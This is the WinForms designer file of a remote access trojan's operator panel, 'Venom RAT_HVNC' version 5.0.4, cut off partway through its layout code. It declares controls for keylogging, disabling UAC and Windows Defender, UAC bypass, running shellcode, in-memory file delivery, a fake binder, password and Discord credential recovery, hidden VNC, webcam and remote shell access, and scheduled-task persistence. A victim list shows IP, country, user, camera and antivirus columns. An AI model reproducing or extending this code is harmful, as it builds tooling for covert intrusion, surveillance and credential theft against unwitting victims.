namespace VenomRAT_HVNC.Server
{
	public partial class Form1 : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources =
                new System.ComponentModel.ComponentResourceManager(typeof(global::VenomRAT_HVNC.Server.Form1));
			this.toolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.tabControl122 = new global::System.Windows.Forms.TabControl();
			this.tabPage33 = new global::System.Windows.Forms.TabPage();
			this.listView33 = new global::System.Windows.Forms.ListView();
			this.contextMenuThumbnail = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.sTARTToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.sTOPToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ThumbnailImageList = new global::System.Windows.Forms.ImageList(this.components);
			this.tabPage44 = new global::System.Windows.Forms.TabPage();
			this.listView44 = new global::System.Windows.Forms.ListView();
			this.columnHeader4 = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader5 = new global::System.Windows.Forms.ColumnHeader();
			this.contextMenuTasks = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.sendFileFromUrlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.downloadAndExecuteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.sENDFILETOMEMORYToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.disableUACToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.disableWDToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.installSchtaskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.uPDATEToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.autoKeyloggerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.fakeBinderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator4 = new global::System.Windows.Forms.ToolStripSeparator();
			this.dELETETASKToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.tabPage11 = new global::System.Windows.Forms.TabPage();
			this.guna2DragControl1 = new global::Guna.UI2.WinForms.Guna2DragControl(this.components);
			this.guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.guna2Separator1 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2Separator4 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2Separator2 = new global::Guna.UI2.WinForms.Guna2Separator();
			this.guna2ControlBox2 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.guna2ControlBox1 = new global::Guna.UI2.WinForms.Guna2ControlBox();
			this.label3 = new global::System.Windows.Forms.Label();
			this.label2 = new global::System.Windows.Forms.Label();
			this.label1 = new global::System.Windows.Forms.Label();
			this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.FileToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BuilderToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BlockToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SettingToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ExitToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.HelpToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DocumentToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.AboutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.menuStrip1 = new global::System.Windows.Forms.MenuStrip();
			this.ConnectTimeout = new global::System.Windows.Forms.Timer(this.components);
			this.TimerTask = new global::System.Windows.Forms.Timer(this.components);
			this.notifyIcon1 = new global::System.Windows.Forms.NotifyIcon(this.components);
			this.performanceCounter2 = new global::System.Diagnostics.PerformanceCounter();
			this.performanceCounter1 = new global::System.Diagnostics.PerformanceCounter();
			this.cLEARToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuLogs = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.UpdateUI = new global::System.Windows.Forms.Timer(this.components);
			this.ping = new global::System.Windows.Forms.Timer(this.components);
			this.SystemControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ClientControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.UninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator23 = new global::System.Windows.Forms.ToolStripSeparator();
			this.StopToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator24 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RestartToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator25 = new global::System.Windows.Forms.ToolStripSeparator();
			this.UpdateToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator13 = new global::System.Windows.Forms.ToolStripSeparator();
			this.SystemToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.LogoutToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator14 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RebootToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator15 = new global::System.Windows.Forms.ToolStripSeparator();
			this.ShutDownToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteShellToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator16 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RemoteScreenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator17 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RemoteCameraToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator18 = new global::System.Windows.Forms.ToolStripSeparator();
			this.FileManagerToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator19 = new global::System.Windows.Forms.ToolStripSeparator();
			this.remoteRegeditToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator20 = new global::System.Windows.Forms.ToolStripSeparator();
			this.ProcessManagerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator21 = new global::System.Windows.Forms.ToolStripSeparator();
			this.netstatToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator22 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RecordToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.RemoteControlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SendFileToMemoryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator26 = new global::System.Windows.Forms.ToolStripSeparator();
			this.SendFileToDiskToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator27 = new global::System.Windows.Forms.ToolStripSeparator();
			this.fromUrlToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator28 = new global::System.Windows.Forms.ToolStripSeparator();
			this.VisteWebsiteToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator29 = new global::System.Windows.Forms.ToolStripSeparator();
			this.runShellcodeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator30 = new global::System.Windows.Forms.ToolStripSeparator();
			this.ChangeWallpaperToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator31 = new global::System.Windows.Forms.ToolStripSeparator();
			this.FileSearchToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MalwareToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DisableWDToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator32 = new global::System.Windows.Forms.ToolStripSeparator();
			this.DisableUACToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BypassUACAToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SilentCleanupToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator33 = new global::System.Windows.Forms.ToolStripSeparator();
			this.RunasToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.hVNCToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.coomingSoonToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.moveToHVNCToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SchtaskInstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator34 = new global::System.Windows.Forms.ToolStripSeparator();
			this.SchtaskUninstallToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.InformationToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.passwordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator35 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator36 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripMenuItem4 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem5 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuClient = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.builderToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator2 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator3 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator5 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator6 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator7 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator8 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator9 = new global::System.Windows.Forms.ToolStripSeparator();
			this.discordToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DiscordRecoveryToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator37 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator10 = new global::System.Windows.Forms.ToolStripSeparator();
			this.justForFunToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripSeparator11 = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripSeparator12 = new global::System.Windows.Forms.ToolStripSeparator();
			this.panel2 = new global::System.Windows.Forms.Panel();
			this.guna2ResizeBox1 = new global::Guna.UI2.WinForms.Guna2ResizeBox();
			this.statusStrip1 = new global::System.Windows.Forms.StatusStrip();
			this.toolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.toolStripStatusLabel2 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.listView1 = new global::System.Windows.Forms.ListView();
			this.lv_ip = new global::System.Windows.Forms.ColumnHeader();
			this.lv_country = new global::System.Windows.Forms.ColumnHeader();
			this.lv_group = new global::System.Windows.Forms.ColumnHeader();
			this.lv_hwid = new global::System.Windows.Forms.ColumnHeader();
			this.lv_user = new global::System.Windows.Forms.ColumnHeader();
			this.lv_camera = new global::System.Windows.Forms.ColumnHeader();
			this.lv_os = new global::System.Windows.Forms.ColumnHeader();
			this.lv_version = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ins = new global::System.Windows.Forms.ColumnHeader();
			this.lv_admin = new global::System.Windows.Forms.ColumnHeader();
			this.lv_av = new global::System.Windows.Forms.ColumnHeader();
			this.lv_ping = new global::System.Windows.Forms.ColumnHeader();
			this.lv_act = new global::System.Windows.Forms.ColumnHeader();
			this.columnHeader1 = new global::System.Windows.Forms.ColumnHeader();
			this.guna2BorderlessForm1 = new global::Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
			this.tabControl122.SuspendLayout();
			this.tabPage33.SuspendLayout();
			this.contextMenuThumbnail.SuspendLayout();
			this.tabPage44.SuspendLayout();
			this.contextMenuTasks.SuspendLayout();
			this.guna2Panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.menuStrip1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
			this.contextMenuLogs.SuspendLayout();
			this.contextMenuClient.SuspendLayout();
			this.panel2.SuspendLayout();
			this.statusStrip1.SuspendLayout();
			base.SuspendLayout();
			this.toolStripMenuItem1.Name = "toolStripMenuItem1";
			this.toolStripMenuItem1.Size = new global::System.Drawing.Size(188, 30);
			this.toolStripMenuItem1.Text = "Online Keylogger";
			this.tabControl122.Controls.Add(this.tabPage33);
			this.tabControl122.Controls.Add(this.tabPage44);
			this.tabControl122.Controls.Add(this.tabPage11);
			this.tabControl122.Location = new global::System.Drawing.Point(662, 310);
			this.tabControl122.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabControl122.Name = "tabControl122";
			this.tabControl122.SelectedIndex = 0;
			this.tabControl122.Size = new global::System.Drawing.Size(510, 135);
			this.tabControl122.SizeMode = global::System.Windows.Forms.TabSizeMode.Fixed;
			this.tabControl122.TabIndex = 3;
			this.tabPage33.Controls.Add(this.listView33);
			this.tabPage33.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage33.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage33.Name = "tabPage33";
			this.tabPage33.Size = new global::System.Drawing.Size(502, 109);
			this.tabPage33.TabIndex = 2;
			this.tabPage33.Text = "Screens1";
			this.tabPage33.UseVisualStyleBackColor = true;
			this.listView33.ContextMenuStrip = this.contextMenuThumbnail;
			this.listView33.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView33.HideSelection = false;
			this.listView33.LargeImageList = this.ThumbnailImageList;
			this.listView33.Location = new global::System.Drawing.Point(0, 0);
			this.listView33.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView33.Name = "listView33";
			this.listView33.ShowItemToolTips = true;
			this.listView33.Size = new global::System.Drawing.Size(502, 109);
			this.listView33.SmallImageList = this.ThumbnailImageList;
			this.listView33.TabIndex = 0;
			this.listView33.UseCompatibleStateImageBehavior = false;
			this.contextMenuThumbnail.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuThumbnail.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.sTARTToolStripMenuItem, this.sTOPToolStripMenuItem });
			this.contextMenuThumbnail.Name = "contextMenuStrip2";
			this.contextMenuThumbnail.Size = new global::System.Drawing.Size(99, 48);
			this.sTARTToolStripMenuItem.ForeColor = global::System.Drawing.SystemColors.ControlText;
			this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
			this.sTARTToolStripMenuItem.Size = new global::System.Drawing.Size(98, 22);
			this.sTARTToolStripMenuItem.Text = "Start";
			this.sTARTToolStripMenuItem.Click += new global::System.EventHandler(this.STARTToolStripMenuItem_Click);
			this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
			this.sTOPToolStripMenuItem.Size = new global::System.Drawing.Size(98, 22);
			this.sTOPToolStripMenuItem.Text = "Stop";
			this.sTOPToolStripMenuItem.Click += new global::System.EventHandler(this.STOPToolStripMenuItem_Click);
			this.ThumbnailImageList.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth16Bit;
			this.ThumbnailImageList.ImageSize = new global::System.Drawing.Size(256, 256);
			this.ThumbnailImageList.TransparentColor = global::System.Drawing.Color.Transparent;
			this.tabPage44.Controls.Add(this.listView44);
			this.tabPage44.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage44.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage44.Name = "tabPage44";
			this.tabPage44.Padding = new global::System.Windows.Forms.Padding(2);
			this.tabPage44.Size = new global::System.Drawing.Size(502, 109);
			this.tabPage44.TabIndex = 3;
			this.tabPage44.Text = "Auto Task4";
			this.tabPage44.UseVisualStyleBackColor = true;
			this.listView44.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.listView44.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[] { this.columnHeader4, this.columnHeader5 });
			this.listView44.ContextMenuStrip = this.contextMenuTasks;
			this.listView44.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.listView44.FullRowSelect = true;
			this.listView44.HideSelection = false;
			this.listView44.Location = new global::System.Drawing.Point(2, 2);
			this.listView44.Margin = new global::System.Windows.Forms.Padding(2);
			this.listView44.Name = "listView44";
			this.listView44.Size = new global::System.Drawing.Size(498, 105);
			this.listView44.TabIndex = 0;
			this.listView44.UseCompatibleStateImageBehavior = false;
			this.listView44.View = global::System.Windows.Forms.View.Details;
			this.columnHeader4.Text = "Task";
			this.columnHeader4.Width = 97;
			this.columnHeader5.Text = "Run times";
			this.columnHeader5.Width = 116;
			this.contextMenuTasks.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.contextMenuTasks.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.sendFileFromUrlToolStripMenuItem, this.downloadAndExecuteToolStripMenuItem, this.sENDFILETOMEMORYToolStripMenuItem1, this.disableUACToolStripMenuItem1, this.disableWDToolStripMenuItem1, this.installSchtaskToolStripMenuItem, this.uPDATEToolStripMenuItem1, this.autoKeyloggerToolStripMenuItem, this.fakeBinderToolStripMenuItem, this.toolStripSeparator4,
				this.dELETETASKToolStripMenuItem
			});
			this.contextMenuTasks.Name = "contextMenuStrip4";
			this.contextMenuTasks.ShowImageMargin = false;
			this.contextMenuTasks.Size = new global::System.Drawing.Size(157, 230);
			this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
			this.sendFileFromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
			this.sendFileFromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
			this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
			this.downloadAndExecuteToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.downloadAndExecuteToolStripMenuItem.Text = "Send file to disk";
			this.downloadAndExecuteToolStripMenuItem.Click += new global::System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
			this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
			this.sENDFILETOMEMORYToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Send file to memory";
			this.sENDFILETOMEMORYToolStripMenuItem1.Click += new global::System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
			this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
			this.disableUACToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.disableUACToolStripMenuItem1.Text = "Disable UAC";
			this.disableUACToolStripMenuItem1.Click += new global::System.EventHandler(this.disableUACToolStripMenuItem1_Click);
			this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
			this.disableWDToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.disableWDToolStripMenuItem1.Text = "Disable WD";
			this.disableWDToolStripMenuItem1.Click += new global::System.EventHandler(this.disableWDToolStripMenuItem1_Click);
			this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
			this.installSchtaskToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
			this.installSchtaskToolStripMenuItem.Click += new global::System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
			this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
			this.uPDATEToolStripMenuItem1.Size = new global::System.Drawing.Size(156, 22);
			this.uPDATEToolStripMenuItem1.Text = "Update all clients";
			this.uPDATEToolStripMenuItem1.Click += new global::System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
			this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
			this.autoKeyloggerToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.autoKeyloggerToolStripMenuItem.Text = "Auto Keylogger";
			this.autoKeyloggerToolStripMenuItem.Click += new global::System.EventHandler(this.autoKeyloggerToolStripMenuItem_Click);
			this.fakeBinderToolStripMenuItem.Name = "fakeBinderToolStripMenuItem";
			this.fakeBinderToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.fakeBinderToolStripMenuItem.Text = "Fake Binder";
			this.fakeBinderToolStripMenuItem.Click += new global::System.EventHandler(this.fakeBinderToolStripMenuItem_Click);
			this.toolStripSeparator4.Name = "toolStripSeparator4";
			this.toolStripSeparator4.Size = new global::System.Drawing.Size(153, 6);
			this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
			this.dELETETASKToolStripMenuItem.Size = new global::System.Drawing.Size(156, 22);
			this.dELETETASKToolStripMenuItem.Text = "Delete";
			this.dELETETASKToolStripMenuItem.Click += new global::System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
			this.tabPage11.BackColor = global::System.Drawing.Color.FromArgb(37, 37, 37);
			this.tabPage11.Location = new global::System.Drawing.Point(4, 22);
			this.tabPage11.Margin = new global::System.Windows.Forms.Padding(2);
			this.tabPage11.Name = "tabPage11";
			this.tabPage11.Padding = new global::System.Windows.Forms.Padding(2);
			this.tabPage11.Size = new global::System.Drawing.Size(502, 109);
			this.tabPage11.TabIndex = 0;
			this.tabPage11.Text = "Clients1";
			this.guna2DragControl1.TargetControl = this.guna2Panel1;
			this.guna2Panel1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.guna2Panel1.Controls.Add(this.guna2Separator1);
			this.guna2Panel1.Controls.Add(this.guna2Separator4);
			this.guna2Panel1.Controls.Add(this.guna2Separator2);
			this.guna2Panel1.Controls.Add(this.guna2ControlBox2);
			this.guna2Panel1.Controls.Add(this.guna2ControlBox1);
			this.guna2Panel1.Controls.Add(this.label3);
			this.guna2Panel1.Controls.Add(this.label2);
			this.guna2Panel1.Controls.Add(this.label1);
			this.guna2Panel1.Controls.Add(this.pictureBox1);
			this.guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.guna2Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.guna2Panel1.Name = "guna2Panel1";
			this.guna2Panel1.ShadowDecoration.Parent = this.guna2Panel1;
			this.guna2Panel1.Size = new global::System.Drawing.Size(1560, 60);
			this.guna2Panel1.TabIndex = 131;
			this.guna2Separator1.Anchor = global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2Separator1.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator1.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator1.FillThickness = 2;
			this.guna2Separator1.Location = new global::System.Drawing.Point(1359, 45);
			this.guna2Separator1.Name = "guna2Separator1";
			this.guna2Separator1.Size = new global::System.Drawing.Size(201, 10);
			this.guna2Separator1.TabIndex = 148;
			this.guna2Separator4.Anchor = global::System.Windows.Forms.AnchorStyles.Left;
			this.guna2Separator4.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator4.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator4.FillThickness = 2;
			this.guna2Separator4.Location = new global::System.Drawing.Point(68, 45);
			this.guna2Separator4.Name = "guna2Separator4";
			this.guna2Separator4.Size = new global::System.Drawing.Size(175, 10);
			this.guna2Separator4.TabIndex = 147;
			this.guna2Separator2.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2Separator2.FillColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.guna2Separator2.FillStyle = global::System.Drawing.Drawing2D.DashStyle.Custom;
			this.guna2Separator2.FillThickness = 4;
			this.guna2Separator2.Location = new global::System.Drawing.Point(0, -3);
			this.guna2Separator2.Name = "guna2Separator2";
			this.guna2Separator2.Size = new global::System.Drawing.Size(1560, 10);
			this.guna2Separator2.TabIndex = 129;
			this.guna2ControlBox2.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox2.ControlBoxType = global::Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			this.guna2ControlBox2.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox2.HoverState.Parent = this.guna2ControlBox2;
			this.guna2ControlBox2.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox2.Location = new global::System.Drawing.Point(1472, 11);
			this.guna2ControlBox2.Name = "guna2ControlBox2";
			this.guna2ControlBox2.ShadowDecoration.Parent = this.guna2ControlBox2;
			this.guna2ControlBox2.Size = new global::System.Drawing.Size(35, 33);
			this.guna2ControlBox2.TabIndex = 11;
			this.guna2ControlBox1.Anchor = global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right;
			this.guna2ControlBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.FillColor = global::System.Drawing.Color.Transparent;
			this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.IconColor = global::System.Drawing.Color.White;
			this.guna2ControlBox1.Location = new global::System.Drawing.Point(1519, 10);
			this.guna2ControlBox1.Name = "guna2ControlBox1";
			this.guna2ControlBox1.ShadowDecoration.Parent = this.guna2ControlBox1;
			this.guna2ControlBox1.Size = new global::System.Drawing.Size(35, 33);
			this.guna2ControlBox1.TabIndex = 10;
			this.label3.AutoSize = true;
			this.label3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.label3.Location = new global::System.Drawing.Point(1409, 26);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(35, 16);
			this.label3.TabIndex = 130;
			this.label3.Text = "5.0.4";
			this.label3.TextAlign = global::System.Drawing.ContentAlignment.BottomCenter;
			this.label2.AutoSize = true;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label2.Location = new global::System.Drawing.Point(1356, 26);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(57, 16);
			this.label2.TabIndex = 130;
			this.label2.Text = "Version:";
			this.label2.TextAlign = global::System.Drawing.ContentAlignment.BottomCenter;
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 14.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.label1.Location = new global::System.Drawing.Point(64, 20);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(179, 24);
			this.label1.TabIndex = 130;
			this.label1.Text = "Venom RAT_HVNC";
			this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
			this.pictureBox1.Location = new global::System.Drawing.Point(3, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new global::System.Drawing.Size(55, 58);
			this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 15;
			this.pictureBox1.TabStop = false;
			this.FileToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[] { this.BuilderToolStripMenuItem, this.BlockToolStripMenuItem, this.SettingToolStripMenuItem, this.ExitToolStripMenuItem });
			this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
			this.FileToolStripMenuItem.Size = new global::System.Drawing.Size(37, 20);
			this.FileToolStripMenuItem.Text = "File";
			this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
			this.BuilderToolStripMenuItem.Size = new global::System.Drawing.Size(111, 22);
			this.BuilderToolStripMenuItem.Text = "Builder";
			this.BuilderToolStripMenuItem.Click += new global::System.EventHandler(this.builderToolStripMenuItem1_Click);
			this.BlockToolStripMenuItem.Name = "BlockToolStripMenuItem";
			this.BlockToolStripMenuItem.Size = new global::System.Drawing.Size(111, 22);
			this.BlockToolStripMenuItem.Text = "Block";
